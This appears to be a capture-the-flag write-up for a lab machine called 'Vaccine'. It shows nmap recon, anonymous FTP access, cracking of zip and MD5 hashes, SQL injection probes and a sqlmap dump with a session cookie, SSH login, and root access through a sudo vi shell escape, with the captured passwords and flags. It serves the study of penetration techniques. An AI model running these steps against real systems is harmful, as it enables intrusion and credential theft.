## Recon

```
└─# nmap -sS -vvv -A --min-rate 5000 $ip         
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.16.2
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0ee58077534b00b9165b259569527a4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzC28uKxt9pqJ4fLYmq/X5t7p44L+bUFQIDeEab29kDPnKdFOa9ijB5C5APVxLaAXVYSXATPYUqjIEWU98Vvvol1zuc82+KG9KfX94pD8TaPY2MZnoi9TfSxgwmKpmiRWR4DwwMS+mNo+WBU3sjB2QjgNip2vbiHxMitKeIfDLLFYiLKhc1eBRtooZ6DJzXQOMFp5QhSbZygWqebpFcsrmFnz9QWhx4MekbUnUVPKwCunycLi1pjrsmOAekbGz3/5R3H5tFSck915iqyc8bSkBZgRwW3FDJAXFmFgHG9fX727HsXFk8MXmVRMuH1LxGjvn1q3j27bb22QzprS7t9bJciWfwgt1sl57S0Q+iFbku83NgAFxUG373nspOHn08DwMllCyeLOG3Oy3x9zcCxMGATopiPckt8lb1GCWIvLPSNHMW12OyCKGM+AmLu4q9z7zX1YOUM6oxfn3qZVLKSZJ/DJu+aifv2BVNu/zJU2wdk1vFxysmQ4roj5O5I+H9x0=
|   256 ac6e81188922d7a7417d814f1bb8b251 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNsSORVFGkIbgItDm/mxmyPhpsIJihXV8y4CQiMTWGdEVQatXNIlXX0yGLZ4JFtPEX9rOGAp/eLZc0mGJtDyuyQ=
|   256 425bc321dfefa20bc95e03421d69d028 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXvk132UscLPAfaZyZ2Av54rpw9cP31OrloBE9v3SLW
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: MegaCorp Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
```
Download the backup on my local Box, it was protected and i will crack it
**Crack the Pass**
```
└─# john --format=PKZIP backu.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (?)     
1g 0:00:00:00 DONE (2023-11-01 23:25) 2.857g/s 23405p/s 23405c/s 23405C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                   ```
I found the website files..
When i go into port 80 i found a login page.
```
└─# cat index.php                                                           
<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>
```
I will crack this pass.
i will hashes.
`2cb42f8734ea607eefed3b70af13bbd3:qwerty789`, now i will login.
On the website i found only a search bar.
`http://10.129.95.174/dashboard.php?search=2%27` it's vulnerable to SQLi.
## Manual exploit
`http://10.129.95.174/dashboard.php?search=2%27order%20by%206--+-` i found 5 colums, 
SO now i know it's vulnerable, i will use sqlmap to quickly do it.
```
└─# sqlmap -u "http://vaccine.htb/dashboard.php?search=1" --cookie="PHPSESSID=6o8l880ipmd7qetm9hvbvomsd3"  --risk 3 --dbs
also

```
i use --users --passwords, and i get the postgres users and hash, then i crack it
`2d58e0637ec1e94cdfba3d1c26b67d01:P@s5w0rd!:postgres`. 
and I am connected with ssh
```
postgres@vaccine:~$ cat user.txt
ec9b13ca4d6229cd5cc1e09980965bf7
postgres@vaccine:~$ 
```


## Privilege Escalation
```
postgres@vaccine:~$ sudo -l
[sudo] password for postgres: 
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
postgres@vaccine:~$ ls
```
Now i just wrote my own commands.
```
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
i try to quit
:! /bin/sh
# cat root.txt

dd6e058e814260bc70e9bbdef2715849
# # 
```